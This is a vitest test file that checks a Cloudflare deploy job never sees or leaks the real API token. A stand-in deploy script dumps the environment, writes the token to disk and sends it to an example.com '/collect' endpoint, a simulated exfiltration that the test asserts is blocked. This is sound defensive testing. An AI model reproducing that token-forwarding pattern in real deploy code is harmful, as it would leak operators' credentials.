// The `worker-deploy` run's Cloudflare credential on one machine (specs/runs/gate.md FD-GATE-066): the run body checks
// out a commit from a bare repository over git's `file://` transport, re-reads the branch head from a GitHub stand-in
// and runs the deploy command through `processGateExec`. The command is a wrangler stand-in from the commit: it reads
// `CLOUDFLARE_API_TOKEN`, sends its deploy to the Cloudflare API and one request to another host, and the job copies
// its environment and its workspace to an evidence directory. Each request leaves through an egress stand-in that
// applies the `cf-api` grant with `attachGrants` and delivers it to a Cloudflare API stand-in, which records the
// headers it receives. The executor host's own environment holds the credential, as an operator's shell does.
import { execFileSync } from "node:child_process";
import {
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from "node:fs";
import { createServer, type IncomingMessage, type Server } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  attachGrants,
  CREDENTIAL_PLACEHOLDER,
  githubReadLayer,
} from "@fractalboxdev/flare-dispatch-catalog";
import { Effect, Layer } from "effect";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { intentList } from "../../../../vendor/mameko/packages/run/src/index.ts";
import { processGateExec } from "../../../../packages/catalog/src/command.ts";
import { GateArtifacts } from "../../../../packages/catalog/src/ports.ts";
import {
  fileDeployLedger,
  runWorkerDeploy,
} from "../../../../packages/catalog/src/worker-deploy.ts";

const REPOSITORY = "acme/widgets";
/** The operator's Cloudflare API token: only the egress stand-in's grant resolver and the executor host hold it. */
const SENTINEL = `cf-sentinel-${process.pid}-${Date.now()}-0123456789abcdef`;

/** What a deploy tool does with its token: one deploy to the Cloudflare API, one request to another host. */
const WRANGLER = `import { mkdirSync, writeFileSync } from "node:fs";
const token = process.env.CLOUDFLARE_API_TOKEN;
writeFileSync(process.env.FD_EVIDENCE + "/env.json", JSON.stringify(process.env));
mkdirSync(".wrangler", { recursive: true });
writeFileSync(".wrangler/token", String(token));
const auth = { authorization: "Bearer " + token };
const deployed = await fetch(process.env.CLOUDFLARE_API_BASE_URL + "/accounts/acc/workers/scripts/widgets", {
  method: "PUT",
  headers: { ...auth, "content-type": "application/javascript" },
  body: "export default {}",
});
console.log("deploy " + deployed.status + " " + (await deployed.text()) + " with " + token);
const other = await fetch(process.env.FD_OTHER_URL + "/collect", { headers: auth });
console.log("other " + other.status);
process.exit(deployed.ok && other.ok ? 0 : 1);
`;

interface Seen {
  readonly url: string;
  readonly authorization: string | null;
}

let root: string;
let evidence: string;
let sha: string;
let github: Server;
let egress: Server;
let upstream: Server;
/** Each request as the job sent it to its egress. */
const fromJob: Seen[] = [];
/** Each request as the egress delivered it, which the Cloudflare API stand-in received. */
const received: Seen[] = [];
let outcome: unknown;
const uploads = new Map<string, string>();

const listen = async (server: Server) => {
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  return `http://127.0.0.1:${typeof address === "object" && address !== null ? address.port : 0}`;
};

const bodyOf = async (req: IncomingMessage) => {
  const chunks: Buffer[] = [];
  for await (const chunk of req) chunks.push(chunk as Buffer);
  return Buffer.concat(chunks);
};

const headersOf = (req: IncomingMessage) => {
  const headers = new Headers();
  for (const [name, value] of Object.entries(req.headers))
    if (typeof value === "string" && !["host", "connection", "content-length"].includes(name))
      headers.set(name, value);
  return headers;
};

/** Every file under `dir`, recursively. */
const filesUnder = (dir: string): string[] =>
  readdirSync(dir).flatMap((name) => {
    const path = join(dir, name);
    return statSync(path).isDirectory() ? filesUnder(path) : [path];
  });

const git = (cwd: string, ...args: readonly string[]) =>
  execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    env: {
      PATH: process.env["PATH"],
      HOME: root,
      GIT_AUTHOR_NAME: "t",
      GIT_AUTHOR_EMAIL: "t@example.com",
      GIT_COMMITTER_NAME: "t",
      GIT_COMMITTER_EMAIL: "t@example.com",
    },
  }).trim();

beforeAll(async () => {
  root = mkdtempSync(join(tmpdir(), "fd-worker-deploy-"));
  evidence = join(root, "evidence");
  mkdirSync(evidence);
  const bare = join(root, "widgets.git");
  const work = join(root, "author");
  git(root, "init", "-q", "--bare", "-b", "main", bare);
  mkdirSync(work);
  git(work, "init", "-q", "-b", "main");
  writeFileSync(join(work, "wrangler.mjs"), WRANGLER);
  git(work, "add", "-A");
  git(work, "commit", "-q", "-m", "deploy");
  git(work, "push", "-q", `file://${bare}`, "main");
  sha = git(work, "rev-parse", "HEAD");

  upstream = createServer((req, res) => {
    received.push({
      url: `https://${req.headers["x-forwarded-host"] ?? ""}${req.url ?? ""}`,
      authorization: req.headers.authorization ?? null,
    });
    void bodyOf(req).then(() => res.writeHead(200).end('{"success":true}'));
  });
  const upstreamUrl = await listen(upstream);

  // The job reaches the egress at `<egress>/<host>/<path>`, which stands for `https://<host>/<path>`: the address of
  // a request the Container's outbound handler intercepts. The grant decision runs on that HTTPS request, and the
  // decided request is delivered to the local Cloudflare API stand-in in place of the named host.
  egress = createServer((req, res) => {
    void (async () => {
      const [, host = "", ...rest] = (req.url ?? "/").split("/");
      const target = `https://${host}/${rest.join("/")}`;
      const body = req.method === "GET" || req.method === "HEAD" ? undefined : await bodyOf(req);
      const asSent = new Request(target, {
        method: req.method ?? "GET",
        headers: headersOf(req),
        ...(body === undefined ? {} : { body }),
      });
      fromJob.push({ url: target, authorization: asSent.headers.get("authorization") });
      const decided = attachGrants(asSent, ["cf-api"], (grant) =>
        grant === "cf-api" ? SENTINEL : undefined,
      );
      const headers = new Headers(decided.headers);
      headers.set("x-forwarded-host", host);
      const answer = await fetch(`${upstreamUrl}/${rest.join("/")}`, {
        method: decided.method,
        headers,
        ...(body === undefined ? {} : { body }),
      });
      res.writeHead(answer.status).end(Buffer.from(await answer.arrayBuffer()));
    })().catch((e: unknown) => res.writeHead(502).end(String(e)));
  });
  const egressUrl = await listen(egress);

  github = createServer((req, res) => {
    const path = `/repos/${REPOSITORY}/git/ref/heads/main`;
    if (req.url !== path) return void res.writeHead(404).end("{}");
    res
      .writeHead(200, { "content-type": "application/json" })
      .end(JSON.stringify({ object: { sha, type: "commit" } }));
  });
  const githubUrl = await listen(github);

  const artifacts = Layer.succeed(GateArtifacts, {
    upload: (name, bytes) =>
      Effect.sync(() => void uploads.set(name, new TextDecoder().decode(bytes))),
  });
  const command = [
    `FD_EVIDENCE='${evidence}'`,
    `CLOUDFLARE_API_BASE_URL='${egressUrl}/api.cloudflare.com/client/v4'`,
    `FD_OTHER_URL='${egressUrl}/example.com'`,
    "node wrangler.mjs",
    `&& cp -R . '${evidence}/workspace'`,
  ].join(" ");

  const held = process.env["CLOUDFLARE_API_TOKEN"];
  const workspaces = process.env["FD_WORKSPACE_ROOT"];
  process.env["CLOUDFLARE_API_TOKEN"] = SENTINEL;
  process.env["FD_WORKSPACE_ROOT"] = root;
  try {
    outcome = await Effect.runPromise(
      runWorkerDeploy({
        repo: `file://${bare}`,
        sha,
        ref: "refs/heads/main",
        scope: REPOSITORY,
        branch: "main",
        entry: { command, grants: ["cf-api"], timeoutSec: 120 },
      }).pipe(
        Effect.provide(
          Layer.mergeAll(
            processGateExec,
            artifacts,
            githubReadLayer({ apiBase: githubUrl, fetch: globalThis.fetch }),
            fileDeployLedger(join(root, "ledger")),
            intentList().layer,
          ),
        ),
      ),
    );
  } finally {
    if (held === undefined) delete process.env["CLOUDFLARE_API_TOKEN"];
    else process.env["CLOUDFLARE_API_TOKEN"] = held;
    if (workspaces === undefined) delete process.env["FD_WORKSPACE_ROOT"];
    else process.env["FD_WORKSPACE_ROOT"] = workspaces;
  }
});

afterAll(async () => {
  for (const server of [github, egress, upstream])
    await new Promise<void>((resolve) =>
      server === undefined ? resolve() : server.close(() => resolve()),
    );
  if (root !== undefined) rmSync(root, { recursive: true, force: true });
});

describe("the worker-deploy run's Cloudflare credential", () => {
  it("[FD-GATE-066] stays out of the job's environment, files and log, and reaches the Cloudflare API only through the cf-api grant", () => {
    expect(outcome).toEqual({ _tag: "success" });

    // The job's environment holds the placeholder, not the executor host's token.
    const env = JSON.parse(readFileSync(join(evidence, "env.json"), "utf8")) as Record<
      string,
      string
    >;
    expect(env["CLOUDFLARE_API_TOKEN"]).toBe(CREDENTIAL_PLACEHOLDER);
    expect(Object.entries(env).filter(([, v]) => v.includes(SENTINEL))).toEqual([]);

    // No file the job wrote or checked out holds it: the environment dump, the tool's state and the whole workspace.
    const files = filesUnder(evidence);
    expect(files).toContain(join(evidence, "workspace/.wrangler/token"));
    expect(files.filter((f) => readFileSync(f).includes(SENTINEL))).toEqual([]);

    // The uploaded deploy log records the deploy and never the credential.
    const log = uploads.get("deploy.log");
    expect(log).toContain("deploy 200");
    expect(log).toContain("other 200");
    expect(log).not.toContain(SENTINEL);

    // Each request leaves the job with the placeholder alone.
    expect(fromJob).toEqual([
      {
        url: "https://api.cloudflare.com/client/v4/accounts/acc/workers/scripts/widgets",
        authorization: `Bearer ${CREDENTIAL_PLACEHOLDER}`,
      },
      { url: "https://example.com/collect", authorization: `Bearer ${CREDENTIAL_PLACEHOLDER}` },
    ]);
    // The grant attaches the credential to the Cloudflare API request after it leaves the job, and to no other host.
    expect(received).toEqual([
      {
        url: "https://api.cloudflare.com/client/v4/accounts/acc/workers/scripts/widgets",
        authorization: `Bearer ${SENTINEL}`,
      },
      { url: "https://example.com/collect", authorization: null },
    ]);
  });
});
